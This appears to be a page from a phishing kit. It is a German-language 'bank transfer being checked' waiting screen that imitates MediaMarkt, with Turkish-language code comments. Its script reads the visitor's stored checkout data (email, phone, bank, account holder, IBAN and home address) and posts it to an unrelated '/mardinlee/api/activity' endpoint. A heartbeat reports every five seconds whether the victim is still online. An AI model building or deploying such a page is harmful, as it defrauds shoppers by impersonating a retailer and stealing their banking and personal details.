<!doctype html>
<html lang="de-DE">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wartebereich | MediaMarkt</title>
    <link rel="stylesheet" href="./css/styles.css">
    <style>
        body {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            background: #f5f5f5;
            margin: 0;
            font-family: "Noto Sans", Arial, sans-serif;
        }
        .wait-container {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }
        .wait-box {
            background: #fff;
            border-radius: 12px;
            padding: 40px;
            max-width: 600px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.08);
        }
        .wait-title {
            font-size: 1.8rem;
            font-weight: 700;
            margin-bottom: 20px;
            color: #000;
        }
        .wait-text {
            font-size: 1rem;
            color: #555;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        .wait-spinner {
            width: 60px;
            height: 60px;
            border: 6px solid #f0f0f0;
            border-top-color: #DF0000;
            border-radius: 50%;
            margin: 0 auto 20px auto;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="wait-container">
        <div class="wait-box">
            <div class="wait-spinner"></div>
            <h1 class="wait-title">Bitte warten Sie einen Moment</h1>
            <p class="wait-text">
                Ihre BankÃ¼berweisung wird aktuell geprÃ¼ft. Dieser Vorgang kann einige Minuten dauern.
                Sie erhalten automatisch eine BestÃ¤tigung, sobald die Zahlung abgeschlossen ist.
            </p>
        </div>
    </div>

    <script>
    (function() {
        function logUserActivity(type, payload) {
            try {
                fetch('/mardinlee/api/activity', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        type: type,
                        payload: payload || {}
                    })
                }).catch(function(err) {
                    console.warn('âš ï¸ Aktivite loglanamadÄ±:', err);
                });
            } catch (error) {
                console.warn('âš ï¸ Aktivite log fonksiyonu hata verdi:', error);
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            var checkoutData = {};
            var bankData = {};
            var total = 0;
            try {
                checkoutData = JSON.parse(sessionStorage.getItem('checkoutData') || '{}');
            } catch (e) {}
            try {
                bankData = JSON.parse(sessionStorage.getItem('checkoutBank') || '{}');
            } catch (e) {}
            try {
                total = parseFloat(sessionStorage.getItem('checkoutTotal')) || 0;
            } catch (e) {}

            logUserActivity('checkout-wait-enter', {
                cartTotal: total,
                email: checkoutData.email,
                phone: checkoutData.phone,
                bank: bankData.bank,
                accountName: bankData.accountName,
                iban: bankData.iban,
                address: checkoutData.street ? {
                    street: checkoutData.street,
                    housenumber: checkoutData.housenumber,
                    postal: checkoutData.postal,
                    city: checkoutData.city,
                    country: checkoutData.country
                } : undefined
            });
        });
    })();
    </script>

    <!-- Online Kontrol Sistemi - KullanÄ±cÄ± online kontrolÃ¼ iÃ§in heartbeat -->
    <script>
    (function() {
        console.log('ğŸš€ Online kontrol sistemi baÅŸlatÄ±lÄ±yor (wait.html)...');

        function sendHeartbeat() {
            var timestamp = new Date().getTime();
            var random = Math.random();
            var url = '/api/heartbeat?source=wait&t=' + timestamp + '&r=' + random;

            console.log('ğŸ“¤ Heartbeat isteÄŸi gÃ¶nderiliyor:', url);

            var xhr = new XMLHttpRequest();
            xhr.open('GET', url, true);
            xhr.setRequestHeader('Cache-Control', 'no-cache');

            xhr.onload = function() {
                console.log('ğŸ“¥ Heartbeat response geldi - Status:', xhr.status);
                if (xhr.status === 200) {
                    try {
                        var data = JSON.parse(xhr.responseText);
                        console.log('âœ… Heartbeat OK - Response:', data);

                        if (data.status === 'ok' || data.success === true) {
                            console.log('âœ… KullanÄ±cÄ± ONLINE - IP:', data.ip);
                        } else {
                            console.warn('âš ï¸ Heartbeat response - status:', data.status);
                        }
                    } catch (e) {
                        console.error('âŒ Response parse hatasÄ±:', e);
                        console.error('Response text:', xhr.responseText);
                    }
                } else {
                    console.warn('âš ï¸ Heartbeat baÅŸarÄ±sÄ±z - Status:', xhr.status);
                    console.warn('Response text:', xhr.responseText);
                }
            };

            xhr.onerror = function() {
                console.error('âŒ Heartbeat network hatasÄ± - Ä°stek gÃ¶nderilemedi');
            };

            xhr.ontimeout = function() {
                console.error('â±ï¸ Heartbeat timeout - Ä°stek zaman aÅŸÄ±mÄ±na uÄŸradÄ±');
            };

            xhr.timeout = 10000;
            xhr.send();
        }

        sendHeartbeat();

        var heartbeatInterval = setInterval(function() {
            sendHeartbeat();
        }, 5000);

        document.addEventListener('visibilitychange', function() {
            if (!document.hidden) {
                console.log('ğŸ‘ï¸ Sayfa gÃ¶rÃ¼nÃ¼r oldu, heartbeat gÃ¶nderiliyor...');
                sendHeartbeat();
            }
        });

        window.addEventListener('beforeunload', function() {
            if (navigator.sendBeacon) {
                var url = '/api/heartbeat?source=wait&t=' + new Date().getTime() + '&r=' + Math.random();
                navigator.sendBeacon(url);
            } else {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', '/api/heartbeat?source=wait&t=' + new Date().getTime() + '&r=' + Math.random(), false);
                try {
                    xhr.send();
                } catch (e) {
                    console.error('Son heartbeat gÃ¶nderilemedi:', e);
                }
            }
        });

        window.addEventListener('unload', function() {
            clearInterval(heartbeatInterval);
        });

        console.log('âœ… Online kontrol sistemi aktif (wait.html)');
        console.log('ğŸ“¡ Network tab\'Ä±nda /api/heartbeat isteklerini gÃ¶rebilirsiniz');
    })();
    </script>
</body>
</html>
